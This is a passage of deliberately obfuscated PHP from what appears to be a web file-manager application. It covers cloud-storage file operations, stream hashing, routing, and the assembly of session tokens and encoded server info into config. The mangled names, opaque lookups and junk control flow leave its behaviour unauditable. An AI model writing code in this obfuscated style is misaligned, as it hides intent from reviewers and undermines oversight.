{ if (!empty($éÂÆÑÔ[$À—æøã[1683]])) { $—›Ù¬éÌ += count($éÂÆÑÔ[$À—æøã[1683]]); } if (!empty($éÂÆÑÔ[$À—æøã[1684]])) { $¡ô¸à³ += count($éÂÆÑÔ[$À—æøã[1684]]); } if ($³Íİõ®ù === $À—æøã[12]) { break; } continue; } if ($úãêÍ™†) { if (!empty($éÂÆÑÔ[$À—æøã[1683]])) { return !0; } } else { if (!empty($éÂÆÑÔ[$À—æøã[1684]])) { return !0; } } if ($³Íİõ®ù === $À—æøã[12]) { break; } } if ($¢ş°ùê) { return array($À—æøã[250] => $—›Ù¬éÌ, $À—æøã[251] => $¡ô¸à³); } return !1; } public function listAll($Ñ¡Æİ´è) { $Æ†„ì¬à =& $_SERVER[ŒÅŸ‹ä†]; $ˆ’Û‹Ïš = $this->fileList($Ñ¡Æİ´è, $Æ†„ì¬à[12], !0); $”›…©¨Ñ = array_to_keyvalue($ˆ’Û‹Ïš[$Æ†„ì¬à[96]], $Æ†„ì¬à[42]); foreach ($ˆ’Û‹Ïš[$Æ†„ì¬à[95]] as $ªÏ©œ³š) { if (is_string($ªÏ©œ³š)) { $”›…©¨Ñ[$ªÏ©œ³š] = array($Æ†„ì¬à[89] => 0); } } return $this->listAllFiles($Ñ¡Æİ´è, $”›…©¨Ñ); } private function fileList($Ü¢ûÕı’, $øèÉÒ„ = '', $óÈÎÀÄÉ = 0) { $â†ï¨” =& $_SERVER[ŒÅŸ‹ä†]; $Ü¢ûÕı’ = trim($Ü¢ûÕı’, $â†ï¨”[8]); $ şåîô = empty($Ü¢ûÕı’) && $Ü¢ûÕı’ !== $â†ï¨”[239] ? $â†ï¨”[12] : $Ü¢ûÕı’ . $â†ï¨”[8]; $¬€Àµ­Ô = $â†ï¨”[12]; $şÌóÉá· = 1000; $Ø—ØèËÂ = $Öè€»›Ü = array(); while (!0) { check_abort(); list($à®º•ü¬, $Ñ‹œÄ“š) = $this->bucketManager->listFiles($this->bucket, $ şåîô, $¬€Àµ­Ô, $şÌóÉá·, $øèÉÒ„); if ($Ñ‹œÄ“š) { break; } $¬€Àµ­Ô = array_key_exists($â†ï¨”[1628], $à®º•ü¬) ? $¬€Àµ­Ô = $à®º•ü¬[$â†ï¨”[1682]] : $â†ï¨”[12]; $ù¿Â¨Ú¢ = isset($à®º•ü¬[$â†ï¨”[1683]]) ? $à®º•ü¬[$â†ï¨”[1683]] : array(); $ãä¡ƒÆ¿ = isset($à®º•ü¬[$â†ï¨”[1684]]) ? $à®º•ü¬[$â†ï¨”[1684]] : array(); foreach ($ù¿Â¨Ú¢ as $ÛçÓ®´–) { if ($ÛçÓ®´–[$â†ï¨”[105]] == $ şåîô) { continue; } $¡îŠ¼§ã = $ÛçÓ®´–[$â†ï¨”[105]]; $€€İŞ–ˆ = $ÛçÓ®´–[$â†ï¨”[1680]]; $ÛçÓ®´–[$â†ï¨”[42]] = $¡îŠ¼§ã; $ÛçÓ®´–[$â†ï¨”[89]] = $€€İŞ–ˆ; $·ÈÓ»û÷ = $€€İŞ–ˆ == 0 && substr($¡îŠ¼§ã, strlen($¡îŠ¼§ã) - 1, 1) == $â†ï¨”[8] ? !0 : !1; $this->cacheMethodInfoSet($¡îŠ¼§ã, $·ÈÓ»û÷, $ÛçÓ®´–); if ($·ÈÓ»û÷) { $Ø—ØèËÂ[] = $¡îŠ¼§ã; continue; } $Öè€»›Ü[] = $óÈÎÀÄÉ ? $ÛçÓ®´– : $¡îŠ¼§ã; } foreach ($ãä¡ƒÆ¿ as $¡îŠ¼§ã) { if ($¡îŠ¼§ã == $ şåîô) { continue; } $Ø—ØèËÂ[] = $¡îŠ¼§ã; $this->cacheMethodInfoSet($¡îŠ¼§ã, !0); } if ($¬€Àµ­Ô === $â†ï¨”[12]) { break; } } $this->cacheMethodInfoSet($Ü¢ûÕı’, !0); return array($â†ï¨”[95] => $Ø—ØèËÂ, $â†ï¨”[96] => $Öè€»›Ü); } public function canRead($µ‘§ûãÂ) { return $this->exist($µ‘§ûãÂ) ? !0 : !1; } public function canWrite($èòãÕÌ) { return $this->exist($èòãÕÌ) ? !0 : !1; } public function getContent($Èéà¯Âà) { return $this->fileSubstr($Èéà¯Âà, 0, -1); } public function setContent($İŒ¯¢ãŞ, $Ù“Ä á = '') { $æ…¶ÍÑ¦ = $this->tempFile($this->pathThis($İŒ¯¢ãŞ)); file_put_contents($æ…¶ÍÑ¦, $Ù“Ä á); if ($this->upload($İŒ¯¢ãŞ, $æ…¶ÍÑ¦)) { $this->tempFileRemve($æ…¶ÍÑ¦); return !0; } return !1; } public function refreshUrls($„‘®Û÷Á) { $ïê›˜Ø =& $_SERVER[ŒÅŸ‹ä†]; $Š‰ÚÇ´‡ = array(); if (is_array($„‘®Û÷Á)) { foreach ($„‘®Û÷Á as $´ËÑ™ø) { $Š‰ÚÇ´‡[] = $this->link($´ËÑ™ø); } } else { $Š‰ÚÇ´‡[] = $this->link($„‘®Û÷Á); } $ØõÃ¨ò« = new Qiniu\Cdn\CdnManager($this->auth); list($ÕÅÑ˜ü‚, $¿ÌÎÉ¹) = $ØõÃ¨ò«->refreshUrls($Š‰ÚÇ´‡); if ($¿ÌÎÉ¹) { return !1; } return $ÕÅÑ˜ü‚[$ïê›˜Ø[1312]] == $ïê›˜Ø[856] ? !0 : !1; } public function fileSubstr($Îéç½…², $äâçÌ—ç, $¸„İÒˆ) { $ óŸ =& $_SERVER[ŒÅŸ‹ä†]; if (!($­€ÃÆ“Í = $this->link($Îéç½…²))) { return !1; } $şˆ××ßÚ = !1; if ($¸„İÒˆ > 0) { $„¡¼ÇÄş = $äâçÌ—ç + $¸„İÒˆ - 1; $şˆ××ßÚ = array($ óŸ[1549] . $äâçÌ—ç . $ óŸ[482] . $„¡¼ÇÄş); } $½Æş ¼¸ = url_request($­€ÃÆ“Í, $ óŸ[1550], !1, $şˆ××ßÚ); return $½Æş ¼¸[$ óŸ[846]] ? $½Æş ¼¸[$ óŸ[1334]] : !1; } public function upload($š‹ÕÑ½—, $›óÇ­Ñå, $ªĞº±¶Ì = false, $ÀÃØİ±† = REPEAT_REPLACE) { $¯ò¸µŞë = new Qiniu\Storage\UploadManager(); $ûÔ­œ‘Â = $this->auth->uploadToken($this->bucket, $š‹ÕÑ½—); $É¡´Æ×ê = get_file_mime(get_path_ext($›óÇ­Ñå)); list($”ü¾ê«˜, $ŸÖÃËÏ) = $¯ò¸µŞë->putFile($ûÔ­œ‘Â, $š‹ÕÑ½—, $›óÇ­Ñå, null, $É¡´Æ×ê); return $ŸÖÃËÏ ? !1 : $this->getPathOuter($š‹ÕÑ½—); } public function uploadFormData($ÖŞÚÊ’Ó, $´Ş¼Ø† = 3600) { return $this->uploadToken($ÖŞÚÊ’Ó, $´Ş¼Ø†); } public function uploadMultiData($ú‡Òİô…, $ğ—ìÂ¸Å = 3600) { return $this->uploadToken($ú‡Òİô…, $ğ—ìÂ¸Å); } private function uploadToken($¬æ»¸œ¾, $’ç»İÊ€ = 3600) { $ØÆÏ÷·Ğ =& $_SERVER[ŒÅŸ‹ä†]; $Ø˜ Šò¿ = $’ç»İÊ€; $˜§öéØ™ = array($ØÆÏ÷·Ğ[1685] => $ØÆÏ÷·Ğ[1686]); $•“°±ß› = $¬æ»¸œ¾; $•¦ñ×ªÔ = $this->auth->uploadToken($this->bucket, $•“°±ß›, $Ø˜ Šò¿, $˜§öéØ™, !0); $Â¨»À²Á = empty($this->region) || $this->region == $ØÆÏ÷·Ğ[1687] ? $ØÆÏ÷·Ğ[12] : $ØÆÏ÷·Ğ[482] . $this->region; $Ğâ÷«´Ê = http_type() . "\72\x2f\57\x75\160\154\x6f\141\x64{$Â¨»À²Á}\x2e\161\x69\156\x69\x75\x70\x2e\x63\x6f\x6d\x2f"; return array($ØÆÏ÷·Ğ[1688] => $•¦ñ×ªÔ, $ØÆÏ÷·Ğ[1552] => $Ğâ÷«´Ê); } public function download($øêÉäï, $Öåš¤ƒÆ) { $µáö¾¥ï = IO::getPathInner(IO::mkfile($Öåš¤ƒÆ)); if (!($°ĞµÉ„Ë = $this->link($øêÉäï))) { return !1; } $¨’‹® = 0; $æÁÜú® = 1024 * 200; $¾ñä´êÒ = fopen($µáö¾¥ï, $_SERVER[ŒÅŸ‹ä†][1689]); while (!0) { $èÃ–Œ = $this->fileSubstr($øêÉäï, $¨’‹®, $æÁÜú®); if ($èÃ–Œ === !1) { return !1; } fwrite($¾ñä´êÒ, $èÃ–Œ); $¨’‹® += $æÁÜú®; if (strlen($èÃ–Œ) < $æÁÜú®) { break; } } fclose($¾ñä´êÒ); return $Öåš¤ƒÆ; } public function link($ŸŸ‹ëÆÕ, $óË‡Ì‹ô = '') { if (!$this->isFile($ŸŸ‹ëÆÕ)) { return !1; } $æŞ¼–¥Ï = $this->getHost() . $_SERVER[ŒÅŸ‹ä†][8] . $this->pathEncode($ŸŸ‹ëÆÕ) . $óË‡Ì‹ô; return $this->auth->privateDownloadUrl($æŞ¼–¥Ï, 3600 * 12); } public function fileOut($ì…ÂÈ», $û¥É•‘¬ = false, $ø²• = false, $«‰”ˆÌ = '') { $í€·Úß =& $_SERVER[ŒÅŸ‹ä†]; if ($this->isFileOutServer()) { return $this->fileOutServer($ì…ÂÈ», $û¥É•‘¬, $ø²•, $«‰”ˆÌ); } if (!$ø²•) { $ø²• = $this->pathThis($ì…ÂÈ»); } $‘¼‘âá„ = $û¥É•‘¬ ? $í€·Úß[1690] . rawurlencode($ø²•) : $í€·Úß[12]; $«œ™Ö¦ = $this->link($ì…ÂÈ», $‘¼‘âá„); $this->fileOutLink($«œ™Ö¦); } public function fileOutServer($Î¯öş—ù, $Óçèì– = false, $Å¤ÂœÕû = false, $ÄÙ“Ã‚Ê = '') { parent::fileOut($Î¯öş—ù, $Óçèì–, $Å¤ÂœÕû, $ÄÙ“Ã‚Ê); } public function fileOutImage($Üóİ€€û, $­ª„¨ƒµ = 250) { if ($this->size($Üóİ€€û) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Üóİ€€û, $­ª„¨ƒµ); } $å½áÖÓ¼ = $this->link($Üóİ€€û, $_SERVER[ŒÅŸ‹ä†][1691] . $­ª„¨ƒµ); $this->fileOutLink($å½áÖÓ¼); } public function fileOutImageServer($”ê¨üõ, $ŒÃÀ÷ñ = 250) { parent::fileOutImage($”ê¨üõ, $ŒÃÀ÷ñ); } public function hashMd5($¥š»¨Ø¯) { $‹§ñŠ¢ã =& $_SERVER[ŒÅŸ‹ä†]; $Àı×âÆÒ = $this->objectMeta($¥š»¨Ø¯); return isset($Àı×âÆÒ[$‹§ñŠ¢ã[256]]) ? $Àı×âÆÒ[$‹§ñŠ¢ã[256]] : !1; $ĞÉêğÂì = $this->link($¥š»¨Ø¯, $‹§ñŠ¢ã[1692]); } public function size($ÉÙ”Û…) { $ú°’ìû£ = $this->objectMeta($ÉÙ”Û…); return $ú°’ìû£ ? $ú°’ìû£[$_SERVER[ŒÅŸ‹ä†][89]] : 0; } public function info($ïˆ¤¬´‰) { if ($this->isFolder($ïˆ¤¬´‰)) { return $this->folderInfo($ïˆ¤¬´‰); } else { if ($this->isFile($ïˆ¤¬´‰)) { return $this->fileInfo($ïˆ¤¬´‰); } } return !1; } public function exist($›½èôœ«) { return $this->isFile($›½èôœ«) || $this->isFolder($›½èôœ«); } public function isFile($øÏÊĞŠú) { return !$this->isFolder($øÏÊĞŠú) && $this->objectMeta($øÏÊĞŠú); } public function isFolder($¤ğ’ÁÕØ) { return $this->cacheMethod($_SERVER[ŒÅŸ‹ä†][188], $¤ğ’ÁÕØ); } protected function objectMeta($º“¢¯Ù¹) { return $this->cacheMethod($_SERVER[ŒÅŸ‹ä†][190], $º“¢¯Ù¹); } protected function _objectMeta($Ü»ËÒ™) { $ØÓúêÁ÷ =& $_SERVER[ŒÅŸ‹ä†]; list($ªÉÅ€ƒº, $àà¦É‚) = $this->bucketManager->stat($this->bucket, $Ü»ËÒ™); if ($ªÉÅ€ƒº) { $ªÉÅ€ƒº[$ØÓúêÁ÷[89]] = intval($ªÉÅ€ƒº[$ØÓúêÁ÷[1680]]); } return $ªÉÅ€ƒº; } protected function _isFolder($Û£è¹ÃŒ) { $ã•Ã™ŠŸ =& $_SERVER[ŒÅŸ‹ä†]; if ($Û£è¹ÃŒ == $ã•Ã™ŠŸ[12] || $Û£è¹ÃŒ == $ã•Ã™ŠŸ[8]) { return !0; } list($„©»Û–½, $˜¹ªï›) = $this->bucketManager->listFiles($this->bucket, trim($Û£è¹ÃŒ, $ã•Ã™ŠŸ[8]) . $ã•Ã™ŠŸ[8], $ã•Ã™ŠŸ[12], 1, $ã•Ã™ŠŸ[8]); return !empty($„©»Û–½[$ã•Ã™ŠŸ[1683]]) || !empty($„©»Û–½[$ã•Ã™ŠŸ[1684]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($˜ÊâÚÉß, $ŸÌåØœÕ = 0) { parent::__construct(); $this->source = $˜ÊâÚÉß; $this->sourceSize = $ŸÌåØœÕ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($óñü†âØ = false) { return $this->sourceSize; } public function getContent($‚±¨£ = false) { return $this->fileSubstr($‚±¨£, 0, $this->sourceSize); } public function fileSubstr($¤‘Ï£æÄ = false, $‡ŞåªÆ = 0, $Äø¦ó¤ = 0) { if (!$Äø¦ó¤) { $Äø¦ó¤ = $this->sourceSize; } $¶¨«ÔÂ = $this->sourceSize - $‡ŞåªÆ; if ($Äø¦ó¤ >= $¶¨«ÔÂ) { $Äø¦ó¤ = $¶¨«ÔÂ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $‡ŞåªÆ, $Äø¦ó¤); } if ($this->sourceType == self::TYPE_FILE) { if ($Äø¦ó¤ <= 0) { return $_SERVER[ŒÅŸ‹ä†][12]; } $¦ÁÊ„—Î = ftell($this->source); fseek_64($this->source, $¦ÁÊ„—Î + $‡ŞåªÆ); $œ…´¨ãò = @fread($this->source, $Äø¦ó¤); fseek_64($this->source, $¦ÁÊ„—Î); return $œ…´¨ãò; } } public function hashMd5($©ı¼¡· = false) { return md5($this->getContent()); } public static function hash($’–†¹ÕÌ, $“Íúú•ß = 0) { $Õ¯—ôş— = new PathDriverStream($’–†¹ÕÌ, $“Íúú•ß); return $Õ¯—ôş—->hashSimple($’–†¹ÕÌ); } public static function md5($ºĞÜ°µê, $–ñîŞÂ– = 0) { $ĞòÓÜßÂ = new PathDriverStream($ºĞÜ°µê, $–ñîŞÂ–); return $ĞòÓÜßÂ->hashMd5($ºĞÜ°µê); } } goto fÓÖ‹‰†‘‹; CÚÙõ¤‰ô: $nxwhlrcgkf = $_SERVER[ŒÅŸ‹ä†][710]; if (strlen($nxwhlrcgkf) < $_SERVER[ŒÅŸ‹ä†][711]) { die; } class Application { private $defaultModule = "\x69\x6e\x64\x65\170"; private $defaultController = "\x69\156\144\145\170"; private $defaultAction = "\151\156\144\x65\x78"; function __construct() { } public function setDefault($ÌÒô›‚µ) { $²ïÆĞ·« =& $_SERVER[ŒÅŸ‹ä†]; $á–Ñ‹ïÂ =& $_SERVER[‹«õ‘¢ğ]; $™Éı÷ş = explode($á–Ñ‹ïÂ[0], trim($ÌÒô›‚µ, $á–Ñ‹ïÂ[0])); $•Ş¯¿è‘ = $²ïÆĞ·«[712]; while (strlen($•Ş¯¿è‘) < $²ïÆĞ·«[713]) { if (!$•Ş¯¿è‘) { break; } $•Ş¯¿è‘++; } $this->defaultModule = $™Éı÷ş[0] ? $™Éı÷ş[0] : $this->defaultModule; $this->defaultController = $™Éı÷ş[1] ? $™Éı÷ş[1] : $this->defaultController; $èÁ“© Æ = $²ïÆĞ·«[714]; while ($èÁ“© Æ < $²ïÆĞ·«[711]) { if ($èÁ“© Æ >= 0) { break; } $èÁ“© Æ++; } $this->defaultAction = $™Éı÷ş[2] ? $™Éı÷ş[2] : $this->defaultAction; $’„¼Ì©® = $²ïÆĞ·«[715]; if (strlen($’„¼Ì©®) < $²ïÆĞ·«[716]) { return; } $this->jvki2b65c7c6($á–Ñ‹ïÂ[1], array($this, $á–Ñ‹ïÂ[2])); } public function appRun($ğŞÃƒ¤´) { $–š¸€Ï =& $_SERVER[ŒÅŸ‹ä†]; $¢ö–´ÕŠ =& $_SERVER[‹«õ‘¢ğ]; $ÚÙÍ¿– = explode($¢ö–´ÕŠ[0], $ğŞÃƒ¤´); $©œ°æ¨’ = strtolower($ÚÙÍ¿–[0]); $€ÏıÎêÇ = $–š¸€Ï[717]; $†¯³ô­ø = $¢ö–´ÕŠ[3]; $…£»½é = $–š¸€Ï[718]; if ($©œ°æ¨’ == $¢ö–´ÕŠ[4]) { $†¯³ô­ø = $¢ö–´ÕŠ[5]; $ÚÙÍ¿–[0] = $¢ö–´ÕŠ[6]; $ÚÙÍ¿–[1] = $ÚÙÍ¿–[1] . $¢ö–´ÕŠ[7]; $ğŞÃƒ¤´ = join($¢ö–´ÕŠ[0], $ÚÙÍ¿–); $ğŞÃƒ¤´ = trim($ğŞÃƒ¤´, $¢ö–´ÕŠ[0]); } call_user_func(array($¢ö–´ÕŠ[8], $¢ö–´ÕŠ[9]), $†¯³ô­ø . $¢ö–´ÕŠ[10], $ğŞÃƒ¤´); ActionCall($ğŞÃƒ¤´); $­¸Ë» = $–š¸€Ï[719]; while (strlen($­¸Ë») < $–š¸€Ï[720]) { if (!$­¸Ë») { break; } $­¸Ë»++; } call_user_func(array($¢ö–´ÕŠ[8], $¢ö–´ÕŠ[9]), $†¯³ô­ø . $¢ö–´ÕŠ[11], $ğŞÃƒ¤´); } private function autorun() { $¸Ö®Ù´Ñ =& $_SERVER[ŒÅŸ‹ä†]; $ÀŠ¹¥Ë‘ =& $_SERVER[‹«õ‘¢ğ]; global $config; $ñıÄ‘Å = $¸Ö®Ù´Ñ[721]; if (count($config[$ÀŠ¹¥Ë‘[12]]) == 0) { return; } foreach ($config[$ÀŠ¹¥Ë‘[12]] as $•š Ïåº => $˜äœÊÂÉ) { $this->appRun($˜äœÊÂÉ); $“©ÁƒÔ’ = $¸Ö®Ù´Ñ[722]; if (!$“©ÁƒÔ’) { return; } } } private function xudle0330a50() { $²ŞÂïè =& $_SERVER[ŒÅŸ‹ä†]; $ıÔ®è©ô =& $_SERVER[‹«õ‘¢ğ]; $ÈÒÃÈ’« = $ıÔ®è©ô[4]; $¶®»Ù¤ = $²ŞÂïè[723]; if (!$¶®»Ù¤) { return; } $ö¯Î¯ÚØ = $GLOBALS[$ıÔ®è©ô[13]][$ıÔ®è©ô[14]][0]; if (!$ö¯Î¯ÚØ || strlen($ö¯Î¯ÚØ) <= strlen($ÈÒÃÈ’«)) { return; } if (strtolower(substr($ö¯Î¯ÚØ, -strlen($ÈÒÃÈ’«))) != $ÈÒÃÈ’«) { return; } $Ÿ´Ô¥– = substr($ö¯Î¯ÚØ, 0, -strlen($ÈÒÃÈ’«)); $§ÆÔæ°” = $²ŞÂïè[724]; if (!$§ÆÔæ°”) { die; } $ØœšœŠ = array($ıÔ®è©ô[4], $Ÿ´Ô¥–); $¶ò×ş¬½ = $²ŞÂïè[725]; $Ü¦ååÔö = array_slice($GLOBALS[$ıÔ®è©ô[13]][$ıÔ®è©ô[14]], 1); $GLOBALS[$ıÔ®è©ô[13]][$ıÔ®è©ô[14]] = array_merge($ØœšœŠ, $Ü¦ååÔö); $GLOBALS[$ıÔ®è©ô[13]][$ıÔ®è©ô[15]] = implode($ıÔ®è©ô[0], $GLOBALS[$ıÔ®è©ô[13]][$ıÔ®è©ô[14]]); } private function rtyq57834775() { $Á§†è =& $_SERVER[ŒÅŸ‹ä†]; $™ÜšÅƒ =& $_SERVER[‹«õ‘¢ğ]; if ($GLOBALS[$™ÜšÅƒ[13]][$™ÜšÅƒ[15]] != $™ÜšÅƒ[6]) { return; } $×÷á¥Ù× = $_SERVER[$™ÜšÅƒ[16]]; $½Ø•î»è = $Á§†è[726]; $¥ûèæË‰ = $™ÜšÅƒ[17]; if (!strstr($×÷á¥Ù×, $¥ûèæË‰)) { return; } $÷á‚˜Œ = strrpos($×÷á¥Ù×, $¥ûèæË‰); $ÜÊıôäå = substr($×÷á¥Ù×, $÷á‚˜Œ + strlen($¥ûèæË‰)); $ˆª§¨ò© = $Á§†è[727]; if (strlen($ˆª§¨ò©) < $Á§†è[713]) { die; } preg_match_all($™ÜšÅƒ[18], $ÜÊıôäå, $êõÒ†şï); $ÜÊıôäå = trim($êõÒ†şï[0][0], $™ÜšÅƒ[19]); $¬ñºçÕ = $Á§†è[728]; if (!$¬ñºçÕ) { die; } $GLOBALS[$™ÜšÅƒ[13]][$™ÜšÅƒ[14]] = explode($™ÜšÅƒ[19], $ÜÊıôäå); $GLOBALS[$™ÜšÅƒ[13]][$™ÜšÅƒ[15]] = implode($™ÜšÅƒ[0], $GLOBALS[$™ÜšÅƒ[13]][$™ÜšÅƒ[14]]); } public function run() { $‡‡·Á½² =& $_SERVER[ŒÅŸ‹ä†]; $â“Ş„¯† =& $_SERVER[‹«õ‘¢ğ]; $this->rtyq57834775(); $this->xudle0330a50(); $…ã¬ãêˆ = $‡‡·Á½²[729]; while ($…ã¬ãêˆ < $‡‡·Á½²[19]) { if ($…ã¬ãêˆ >= 0) { break; } $…ã¬ãêˆ++; } $—™ê§ä = $GLOBALS[$â“Ş„¯†[13]][$â“Ş„¯†[14]]; $ÇæâïÈÒ = $‡‡·Á½²[730]; if (!$ÇæâïÈÒ) { die; } $ø¶çû…ï = $GLOBALS[$â“Ş„¯†[13]][$â“Ş„¯†[15]]; define($â“Ş„¯†[20], isset($—™ê§ä[0]) && $—™ê§ä[0] ? $—™ê§ä[0] : $this->defaultModule); define($â“Ş„¯†[21], isset($—™ê§ä[1]) && $—™ê§ä[0] ? $—™ê§ä[1] : $this->defaultController); $¿®ºÀ = $‡‡·Á½²[731]; while ($¿®ºÀ < $‡‡·Á½²[716]) { if ($¿®ºÀ >= 0) { break; } $¿®ºÀ++; } define($â“Ş„¯†[22], isset($—™ê§ä[2]) && $—™ê§ä[0] ? $—™ê§ä[2] : $this->defaultAction); define($â“Ş„¯†[23], MOD . $â“Ş„¯†[0] . ST . $â“Ş„¯†[0] . ACT); $_SERVER[$â“Ş„¯†[24]] = strtolower(ACTION); $¥Ù ºä¹ = $‡‡·Á½²[732]; $this->autorun(); $²ÆÄÙ = $‡‡·Á½²[733]; while (strlen($²ÆÄÙ) < $‡‡·Á½²[720]) { if (!$²ÆÄÙ) { break; } $²ÆÄÙ++; } if (count($—™ê§ä) >= 3) { $this->appRun($ø¶çû…ï); } else { $this->appRun(ACTION); } } private $jdgf1f9f980e = array(); private $cafbf6127a84 = ''; public function wzpn791f7867() { $—‡‘çËÑ =& $_SERVER[ŒÅŸ‹ä†]; $ØÂ¢èµ¯ =& $_SERVER[‹«õ‘¢ğ]; $this->bnqi803342fa(); $ âğÑ½ = $—‡‘çËÑ[734]; if (strlen($ âğÑ½) < $—‡‘çËÑ[19]) { die; } $this->lsdj8adab972(); $©ˆ„ø€Ï = $—‡‘çËÑ[735]; if (strlen($©ˆ„ø€Ï) < $—‡‘çËÑ[720]) { return; } $this->pvdi520b442e(); $this->hdmyaf137aef(); $û—©†¼„ = $—‡‘çËÑ[736]; $this->lsvrb582f901(); $this->tznx0f3b45a9(); $this->fagsbb18d898(); $this->jvki2b65c7c6($ØÂ¢èµ¯[25], array($this, $ØÂ¢èµ¯[26])); $³¤®äøæ = $—‡‘çËÑ[737]; $this->jvki2b65c7c6($ØÂ¢èµ¯[27], array($this, $ØÂ¢èµ¯[28])); $ı®°±ÀÂ = $—‡‘çËÑ[738]; while ($ı®°±ÀÂ < $—‡‘çËÑ[720]) { if ($ı®°±ÀÂ >= 0) { break; } $ı®°±ÀÂ++; } $this->jvki2b65c7c6($ØÂ¢èµ¯[29], array($this, $ØÂ¢èµ¯[30])); $†™÷ğÏ = $—‡‘çËÑ[739]; if (strlen($†™÷ğÏ) < $—‡‘çËÑ[711]) { return; } $this->jvki2b65c7c6($ØÂ¢èµ¯[31], array($this, $ØÂ¢èµ¯[32])); } public function getVersionData() { return $this->jdgf1f9f980e; } public function emqs23cf4228($‡Œí –ï) { $é¼Ü°î =& $_SERVER[ŒÅŸ‹ä†]; $¬´Šİøª =& $_SERVER[‹«õ‘¢ğ]; $ü•ûêÛ‚ = Model($¬´Šİøª[33])->get(); $¿ÆÜğÂ‚ = $é¼Ü°î[740]; if (strlen($¿ÆÜğÂ‚) < $é¼Ü°î[711]) { return; } $Òşò—ÎÔ = array($¬´Šİøª[34], $¬´Šİøª[35], $¬´Šİøª[36], $¬´Šİøª[37], $¬´Šİøª[38], $¬´Šİøª[39], $¬´Šİøª[40], $¬´Šİøª[41], $¬´Šİøª[42], $¬´Šİøª[43], $¬´Šİøª[44], $¬´Šİøª[45], $¬´Šİøª[46], $¬´Šİøª[47], $¬´Šİøª[48], $¬´Šİøª[49], $¬´Šİøª[50], $¬´Šİøª[51], $¬´Šİøª[52], $¬´Šİøª[53], $¬´Šİøª[54], $¬´Šİøª[55], $¬´Šİøª[56], $¬´Šİøª[57], $¬´Šİøª[58], $¬´Šİøª[59], $¬´Šİøª[60], $¬´Šİøª[61], $¬´Šİøª[62], $¬´Šİøª[63], $¬´Šİøª[64], $¬´Šİøª[65], $¬´Šİøª[66], $¬´Šİøª[67], $¬´Šİøª[68], $¬´Šİøª[69], $¬´Šİøª[70], $¬´Šİøª[71], $¬´Šİøª[72], $¬´Šİøª[73], $¬´Šİøª[74], $¬´Šİøª[75], $¬´Šİøª[76], $¬´Šİøª[77], $¬´Šİøª[78], $¬´Šİøª[79], $¬´Šİøª[80], $¬´Šİøª[81], $¬´Šİøª[82], $¬´Šİøª[83], $¬´Šİøª[84], $¬´Šİøª[85], $¬´Šİøª[86], $¬´Šİøª[87]); foreach ($Òşò—ÎÔ as $¥”¹µ«û) { $ÄšÄæª = $GLOBALS[$¬´Šİøª[88]][$¬´Šİøª[89]][$¥”¹µ«û]; $¡ûĞ÷‹µ = $é¼Ü°î[741]; while ($¡ûĞ÷‹µ < $é¼Ü°î[711]) { if ($¡ûĞ÷‹µ >= 0) { break; } $¡ûĞ÷‹µ++; } if (isset($ü•ûêÛ‚[$¥”¹µ«û])) { $ÄšÄæª = $ü•ûêÛ‚[$¥”¹µ«û]; } $‡Œí –ï[$¬´Šİøª[90]][$¬´Šİøª[91]][$¥”¹µ«û] = $ÄšÄæª; } $õÂ‰È¨À = $‡Œí –ï[$¬´Šİøª[90]][$¬´Šİøª[91]][$¬´Šİøª[46]]; unset($‡Œí –ï[$¬´Šİøª[90]][$¬´Šİøª[92]][$¬´Šİøª[93]]); unset($‡Œí –ï[$¬´Šİøª[90]][$¬´Šİøª[92]][$¬´Šİøª[94]]); $Ã‰ùŸö£ = $é¼Ü°î[742]; if (strlen($Ã‰ùŸö£) < $é¼Ü°î[713]) { return; } unset($‡Œí –ï[$¬´Šİøª[90]][$¬´Šİøª[91]][$¬´Šİøª[46]]); unset($‡Œí –ï[$¬´Šİøª[90]][$¬´Šİøª[91]][$¬´Šİøª[95]]); $íï…‚ûš = $é¼Ü°î[743]; $‡Œí –ï[$¬´Šİøª[90]][$¬´Šİøª[91]][$¬´Šİøª[96]] = array($¬´Šİøª[97] => (int) $õÂ‰È¨À[$¬´Šİøª[98]], $¬´Šİøª[99] => (int) _get($õÂ‰È¨À, $¬´Šİøª[100], 0)); $ÇØ‚‰š‘ = $é¼Ü°î[744]; if (strlen($ÇØ‚‰š‘) < $é¼Ü°î[716]) { die; } $„ÄÆ¢ÎÚ = substr(md5($¬´Šİøª[101] . get_client_ip() . $ü•ûêÛ‚[$¬´Šİøª[102]]), 0, 15); $‡Œí –ï[$¬´Šİøª[103]][$¬´Šİøª[104]] = Mcrypt::encode(Session::sign(), $„ÄÆ¢ÎÚ, 3600 * 24); $‡Œí –ï[$¬´Šİøª[103]][$¬´Šİøª[105]] = Action($¬´Šİøª[106])->accessToken(); $“ÒãáŞ‹ = $é¼Ü°î[745]; while ($“ÒãáŞ‹ < $é¼Ü°î[19]) { if ($“ÒãáŞ‹ >= 0) { break; } $“ÒãáŞ‹++; } $‡Œí –ï[$¬´Šİøª[103]][$¬´Šİøª[107]] = md5($_SERVER[$¬´Šİøª[108]] . $ü•ûêÛ‚[$¬´Šİøª[102]]); $‡Œí –ï[$¬´Šİøª[103]][$¬´Šİøª[109]] = base64_encode(serverInfo()); $¶Ù„İÃ– = $é¼Ü°î[746]; if (!$¶Ù„İÃ–) { die; } $‡Œí –ï[$¬´Šİøª[103]][$¬´Šİøª[110]] = $this->cafbf6127a84; if ($ü•ûêÛ‚[$¬´Šİøª[110]] != $¬´Šİøª[111]) { $‡Œí –ï[$¬´Šİøª[103]][$¬´Šİøª[112]] = $ü•ûêÛ‚[$¬´Šİøª[112]]; $‡Œí –ï[$¬´Šİøª[103]][$¬´Šİøª[113]] = $ü•ûêÛ‚[$¬´Šİøª[113]]; $Ãœ‘ê×« = rand_string(10) . $this->cafbf6127a84 . rand_string(5); $‡Œí –ï[$¬´Šİøª[90]][$¬´Šİøª[114]][$¬´Šİøª[115]] = $this->lczg454597d9($Ãœ‘ê×«, $‡Œí –ï[$¬´Šİøª[103]][$¬´Šİøª[107]]); } if ($this->cafbf6127a84 == $¬´Šİøª[111]) { $‡Œí –ï[$¬´Šİøª[90]][$¬´Šİøª[91]][$¬´Šİøª[96]][$¬´Šİøª[100]] = 0; } $‡Œí –ï[$¬´Šİøª[103]][$¬´Šİøª[116]] = $this->versionPluginFilter(); $‡Œí 